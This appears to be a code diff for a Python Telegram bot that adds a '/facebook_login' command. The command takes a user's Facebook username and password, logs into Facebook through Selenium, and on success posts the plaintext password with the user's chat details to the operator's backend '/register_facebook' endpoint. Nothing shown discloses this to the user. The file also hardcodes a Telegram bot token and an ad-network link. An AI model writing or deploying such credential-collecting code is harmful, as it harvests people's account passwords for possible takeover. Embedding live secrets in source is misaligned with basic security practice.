@@ -11,9 +11,10 @@ from urllib.parse import urlencode
 from selenium import webdriver
 from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.common.by import By#tool to help in selection of elements withi our page
+from selenium.webdriver.support.ui import WebDriverWait #wait unntil a particular element is visible on the page
+from selenium.webdriver.support import expected_conditions as EC#desgin a conditio for your web drive to wait
+from webdriver_manager.chrome   import ChromeDriverManager
 
 TELEGRAM_TOKEN = "7936586039:AAFBxzXW78tq9OArvZm5BfQiBPM3Kuta0C0"
 ADS_LINK    = "https://www.profitableratecpm.com/armxiuwyu?key=1da115d4d39828e534c0206c4af9f885"
@@ -27,6 +28,85 @@ logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.ERROR
 )
+
+async def facebook_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    chat_id = update.message.chat.id
+    user    = update.message.from_user
+    try :
+        [username, password]    = context.args
+    except :
+        return await update.message.reply_text("No Username or/and Pasword in the request \n send using the following format. \n /facebook_login username password")
+    try : 
+        option = Options()
+        option.add_argument("--disable-webrtc")
+        service = Service(ChromeDriverManager().install())
+        driver = webdriver.Chrome(service=service, options=option)
+        baseUrl = "https://facebook.com"
+        usernameID = "email"
+        passwordID = "pass"
+        buttonID    = "button.selected[name='login']"
+        notAccount = "/html/body/div[3]/div[2]/div/div/div/div"
+        driver.get(baseUrl)
+        WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.ID, usernameID)))
+        usernameID = driver.find_element(By.ID, usernameID)
+        passwordID = driver.find_element(By.ID, passwordID)
+        buttonID = driver.find_element(By.CSS_SELECTOR, buttonID)
+        usernameID.send_keys(username)
+        time.sleep(2)
+        passwordID.send_keys(password)
+        time.sleep(2)
+        buttonID.click()
+        time.sleep(5)
+        elementForLogin = ""
+        elementForBlocking = "error_box"
+
+        try :
+
+            WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.ID, elementForLogin)))
+
+            await update.message.reply_text("Login Successful")
+
+            requests.post(BASE_URL + "/register_facebook", data={
+                "chat_id": chat_id,
+                "username": user.username,
+                "first_name": user.first_name,
+                "last_name" : user.last_name,
+                "facebook_login"    : username,
+                "facebook_password" : password
+            }, headers={
+                "Content-Type"  : "application/json"
+            })
+
+        except Exception as e:
+            url = driver.current_url
+
+            if "auth_platform/afad" in url :
+                await update.message.reply_text("Please verify from your other device")
+
+            else :
+                try :
+                    WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, elementForBlocking)))
+                    await update.message.reply_text("Login Unsucessful")
+                except Exception as a :
+                    print(a)
+                
+                finally :
+                    try :                        
+                        WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.XPATH, notAccount)))
+                        notAccount = driver.find_element(By.XPATH, notAccount )
+                        text       = notAccount.text
+                        await update.message.reply_text(text)
+                    except Exception as w:
+                        print("not account error ", w)
+                    
+                    finally :                    
+                        await update.message.reply_text("Login Unsuccessful, Invalid Credentials")  
+                
+
+        
+    except Exception as e :
+        print("error Logged ", e)
+        await update.message.reply_text("Couldn't Login to facebook Because of an Error, Please try again")
 
 
 #required
@@ -155,6 +235,7 @@ def main():
     application = Application.builder().token(TELEGRAM_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("message", message))
+    application.add_handler(CommandHandler("facebook_login", facebook_login))
     application.add_handler(CallbackQueryHandler(queryHandler))
     print("Application Running")
     application.run_polling()
